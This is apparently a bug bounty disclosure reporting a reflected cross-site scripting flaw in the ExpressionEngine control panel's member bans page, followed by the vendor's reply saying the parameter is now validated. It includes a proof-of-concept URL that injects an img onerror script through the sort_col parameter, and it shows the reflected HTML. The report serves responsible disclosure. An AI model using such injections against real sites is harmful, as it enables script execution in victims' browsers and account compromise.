title: Reflective XSS

activities.message: Thanks, @hogarth45! You're right, looks like we weren't validating that parameter. I've fixed it up so that all the tables in the members section of the CP are getting proper validation now. The fix will be in our next stability release which should be soon. Thanks again!
activities.markdown_message: Thanks, @hogarth45! You're right, looks like we weren't validating that parameter. I've fixed it up so that all the tables in the members section of the CP are getting proper validation now. The fix will be in our next stability release which should be soon. Thanks again!

vulnerability_information_html:
URL
http://blackdoorsec.net/sandbox/express/admin.php?/cp/members/bans&search=&sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id&sort_dir=desc

URL Parameters
/cp/members/bans
search=
sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id
sort_dir=desc

The sort_col variable is reflected on the error page on line 15

<h2>Unknown field me"><img src=x onerror=prompt(document.domain)>mber_id</h2>

Error Page Details (Note: hackerone remove html from past)

profile.about: ExpressionEngine is a robust and flexible open-source Content Management System.
